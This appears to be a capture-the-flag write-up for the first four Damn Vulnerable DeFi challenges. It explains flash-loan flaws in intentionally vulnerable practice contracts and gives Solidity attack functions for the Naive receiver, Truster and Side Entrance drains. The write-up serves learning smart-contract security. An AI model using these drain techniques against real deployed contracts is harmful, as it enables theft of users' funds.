# Damn-Vulnerable-DeFi-Foundry
## 1. Unstoppable
This is an example of Denial of Service where the line `convertToShares(totalSupply) != balanceBefore` is vulnerable. So, by sending any amount of tokens, that is greater than 0, we could cause Denial of Service
## 2. Naive receiver
In the `function flashLoan()`, the pool initiates a flash loan by transferring ETH to the receiver and allowing it to execute arbitrary logic. However, the `function onFlashLoan()` in the receiver contract doesn't properly validate the caller's identity, allowing anyone to invoke it. By exploiting this vulnerability, an attacker can repeatedly trigger the `function flashLoan()`, draining the receiver's ETH balance by forcing it to pay the fixed fee with each loan. This attack effectively takes all ETH held by the receiver contract, exploiting the lack of proper authorization checks in the `function onFlashLoan()`.
### Solution
```solidity
function attack(IERC3156FlashBorrower receiver, NaiveReceiverLenderPool pool) external {
    for (uint256 i = 0; i < 10; i++) {
        pool.flashLoan(receiver, ETH, 0, "");
    }
}
```
## 3. Truster
In this vulnerable flash loan function, the vulnerability lies in the external code execution through the `target.functionCall(data)` line. While flash loans are designed to provide temporary liquidity, allowing borrowers to execute arbitrary code poses a significant security risk. By accepting a target address and call data as parameters, the function enables the execution of any function on the target contract. This opens the door to potential exploits.
```solidity
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)external nonReentrant returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore)
            revert RepayFailed();

        return true;
    }
```
### Solution
To exploit this vulnerability, we will utilize the `attack` function, which interacts with the `TrusterLenderPool` and `DamnValuableToken` contracts. In this function, we initiate a flash loan by calling `pool.flashLoan(0, address(this), address(token), abi.encodeWithSignature("approve(address,uint256)", address(this), 1000000))`. Here, we request a loan of 0 tokens, specifying our contract as the borrower and the DamnValuableToken contract as the target. The `abi.encodeWithSignature` function prepares the call data with the signature of the `approve` function, allowing us to approve our contract to spend 1000000 tokens from the pool.

Subsequently, we execute `token.transferFrom(address(pool), address(this), 1000000)` to transfer the approved tokens from the pool to our contract. This sequence of actions enables us to exploit the vulnerability.
```solidity
function attack(TrusterLenderPool pool, DamnValuableToken token)external{
        pool.flashLoan(0,address(this), address(token),abi.encodeWithSignature("approve(address,uint256)",address(this),1000000));

        token.transferFrom(address(pool),address(this),1000000);
        }
```
## 4. Side Entrance
The `function flashLoan()` lacks proper verification during loan execution, allowing attackers to exploit a discrepancy between the token balance and the internal accounting system. By depositing borrowed funds back into the contract during the callback phase, attackers can manipulate the accounting system, deceiving the verification process and enabling unauthorized fund withdrawals.
```solidity
function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore)
            revert RepayFailed();
    }
```
### Solution
This contract exploits a vulnerability in the `SideEntranceLenderPool` contract by executing a flash loan attack. In the `function attack()`, it initiates a flash loan from the pool with an initial balance of 1000 ether, then immediately withdraws the funds. Additionally, the `function execute()` allows the attacker to deposit any received funds back into the pool, further manipulating its balance. Finally, the contract includes a `function receive()` to accept incoming Ether payments.
```solidity
function attack()external{
        pool.flashLoan(INITIAL_BALANCE_POOL);
        pool.withdraw();
    }

function execute()external payable{
        pool.deposit{value: msg.value}();
    }
```

